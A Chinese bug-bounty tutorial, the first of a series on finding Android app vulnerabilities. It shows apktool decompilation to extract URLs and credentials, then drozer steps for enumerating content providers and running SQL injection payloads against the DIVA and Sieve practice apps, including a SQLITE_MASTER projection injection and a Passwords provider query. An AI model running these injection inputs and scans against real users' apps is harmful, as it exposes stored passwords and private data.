# SRC之APP挖掘方向第一部分

------

本章简介：这一部分讲解了对于app漏洞挖掘的工具篇

> * 第一部分针对app漏洞挖掘工具篇！
> * 第二部分为组件代码层，如何找到客户端程序安全、敏感信息安全、密码安全、密码策略设置、进程保护、通信安全等等的安全漏洞问题！
> * 第三部分为应用层，如何知道app的传输流量是什么加密并如何解密，得到服务接口如何利用，除了http协议之外的协议如何拦截并重放等！


![cmd-markdown-logo](http://thyrsi.com/t6/378/1538285208x-1566661319.jpg)



**测试环境：安卓版本手机或者安卓模拟器、burp、drozer、apktool等等**


> 组件代码层：  对于这一块的测试方法可以使用apktool对APK进行反编译或者drozer进行自动化测试

------

## APKTOOL使用：

>对于其他的逆向挖漏洞本人菜鸡不会，只会拿源码找一下敏感地址或者账号信息在利用。

**使用命令apktool d 1.apk  即可对1.apk进行反编译，如果编译出错（app有保护机制）前提是没混淆过的加密算法encrypt、hash之内的单词**

![1][1]


 

> 编译完成后会在桌面出现一个以app命名的文件夹或者直接使用其他工具把app内的字符，url直接拽出来如（http，www，com，cn，.action等关键字）

**如图对京东某app进行测试**

![11][2]

![3][3]


**通过上述方法获取到url或者敏感信息后可以深入利用，具体怎么利用各位大佬应该都知道，如果在加入自动化神器的话对挖src的效率会更大的提升。**

> 
如某东app泄露的一个IP，打开之后是一个子系统管理，这个地址如果去通过子域名ip探测C段是获取不到的.


----------


##Drozer使用：
>这个工具就叼了，和walk黑客大佬说了一下，就直接扔了一个drozer文档过来

- 写一下操作步骤吧：

**首先如果使用手机操作的话，电脑要有adb，用模拟器的话就不用去安装adb了因为大部分的模拟器都是自带adb的！（演示的是使用夜神模拟器操作）**

Drozer
------

- 这个工具各位大佬可以自行去下载 打开模拟器后安装drozer的Agent代理

![4][4]

> A. 打开夜神自带的adb然后执行命令（adb devices）查看一下设备有没有列出来

![5][5]

![6][6]

    可以看到咱们的设备已经准备就绪了随时准备开干

 

> B. 不过咱们这次是讲的第一部分所以不讲如何在adb里面玩，第二步就是转发一下端口好让drozer连接上命令如下： 
> adb.exe forward tcp:31415 tcp:31415

![7][7]

执行后就可以了

补充：
---

 - 报10061报错    这个时候，看下手机是不是被其他管理软件连接了，把管理软件退出。   然后重新输入转发命令fcp。则可以解决
   
 - 报10054错误  这个错误很好解决，在手机端，把agent关闭，重新打开，则可以解决

> C.这是最后一步了，在drozer的目录直接输入命令drozer console connect进入它的控制台

![8][8]


 

    完美，这样就可以一顿操作猛如虎了

**上述已经说了如何进入drozer了，那面就看看如何扫描组件代码层的问题的
我们要对某个APP进行漏洞检测的话需要确定它是什么名字，那么就用到下面的命令了**

    run app.package.list（列出所有的app）ps：想不让它乱码就用linux系统操作

![9][9]

> **大家可以看到我上述标记的app名称，它就是要做测试的app，文件名:jakhar.aseem.diva，一定要用前面的当作命名，不要拿()内的Diva当作app的名字**

    一般要对某个app进行漏洞挖掘的话首先咱们要知道这个app的一些信息，那么就用下面的命令查看一下它的信息：
`run app.package.info -a jakhar.aseem.diva` 

    可以看到-a后面指定的这个就是咱们上一步要测试的app!

![10][10]


>  通过上述可以看到版本信息，数据存储的目录，用户ID,组ID,是否有共享库，还有权限信息等

- 扫描可以访问content provider的URI（数据泄露）

> 命令：run scanner.provider.finduris -a APP

![11][11]

**通过上述图片可以看到app有泄露，但是是否存在敏感信息还需要进去看看** 

    run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys

![12][12]

**但当将路径变换为Keys/时,则不会检查路径，可顺利查询数据**

![13][13]

> PS: 在发现这种问题的时候首先要确定泄露的信息是否属于可公开的如安装插件信息等，不涉及到用户的敏感数据，如果是公开的就不要提交到src了。
> 由于drozer工具能做的事比较多，所以这一部分不能在drozer
> 上面浪费太多时间，在举例一个sql注入的例子，下次在讲drozer实战app漏洞挖掘

说到sql了还是安卓的那就先上一波理论：
--------------------

- Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。
- 使用projection参数和seleciton参数可以传递一些简单的SQL注入语句到Content provider。

**如：**

![14][14]


**看完上述的理论之后那就知道安卓的sql和web没啥区别，那就直接上drozer工具扫描注入的命令：**

> run scanner.provider.injection  -a APP

![15][15]


  

> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"

![16][16]


  

> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"

![17][17]
  

> run app.provider.query
>content://com.mwr.example.sieve.DBContentProvider/Passwords/
> --projection "* FROM SQLITE_MASTER WHERE type='table'--"

![18][18]


  


----------


**这样就可以看到数据库之类的了，那么下面咱在看一下如何在web下进行sql注入**

- 首先在drozer内开启一下web服务：

> run auxiliary.webcontentresolver

![19][19]


  

    可以看到端口是8080，如果出错的话就杀一下8080端口的进程

![20][20]


  

    找到目标app，然后访问，发现无法访问是因为做了模式匹配，所以Permission Denial

![21][21]


  

    http://127.0.0.1:8080/query?uri=content://com.mwr.example.sieve.DBContentProvider/Keys/&projection=*

 
![22][22]


**如果感觉手工比较繁琐的话那就直接上sqlmap**

![23][23]


  

> 到这里drozer本章就结束了，另外如果感觉使用检查sql注入的命令 
run scanner.provider.injection
> -a app 效率太慢，不想只检查一个app，那么你可以直接在窗口输入 
run scanner.provider.injection
这样他就会检查你手机内所有app是否存在sql漏洞，其他漏洞批量检查也是一样的方法

![24][24]


  [1]: http://thyrsi.com/t6/378/1538285347x-1404792622.png
  [2]: http://thyrsi.com/t6/378/1538285450x-1404729662.png
  [3]: http://thyrsi.com/t6/378/1538285486x-1404729662.png
  [4]: http://thyrsi.com/t6/378/1538285560x-1566661349.png
  [5]: http://thyrsi.com/t6/378/1538285596x-1404792622.png
  [6]: http://thyrsi.com/t6/378/1538285624x-1404792253.png
  [7]: http://thyrsi.com/t6/378/1538285661x-1566661193.png
  [8]: http://thyrsi.com/t6/378/1538285704x-1566661319.png
  [9]: http://thyrsi.com/t6/378/1538285747x-1404729656.png
  [10]: http://thyrsi.com/t6/378/1538285788x-1566661157.png
  [11]: http://thyrsi.com/t6/378/1538285829x-1566661349.png
  [12]: http://thyrsi.com/t6/378/1538285867x-1566661193.png
  [13]: http://thyrsi.com/t6/378/1538285904x-1566660906.png
  [14]: http://thyrsi.com/t6/378/1538285939x-1404792730.png
  [15]: http://thyrsi.com/t6/378/1538285976x-1404729710.png
  [16]: http://thyrsi.com/t6/378/1538286010x-1566660906.png
  [17]: http://thyrsi.com/t6/378/1538286043x-1404792730.png
  [18]: http://thyrsi.com/t6/378/1538286076x-1566661026.png
  [19]: http://thyrsi.com/t6/378/1538286111x-1404729656.png
  [20]: http://thyrsi.com/t6/378/1538286143x-1566661319.png
  [21]: http://thyrsi.com/t6/378/1538286185x-1566660906.png
  [22]: http://thyrsi.com/t6/378/1538286218x-1566661319.png
  [23]: http://thyrsi.com/t6/378/1538286249x-1404792622.png
  [24]: http://thyrsi.com/t6/378/1538286283x-1404792658.png
> 我在放一个drozer 的常用命令介绍地址，大家可以进去看一下drozer的其他命令`

    https://www.cnblogs.com/goodhacker/p/3906180.html

第一部分工具篇完毕； （敬请期待第二部分）
---------------------

第二部分为组件代码层，如何找到客户端程序安全、敏感信息安全、密码安全、密码策略设置、进程保护、通信安全等等的安全漏洞问题！！！
---------------------------------------------------------------

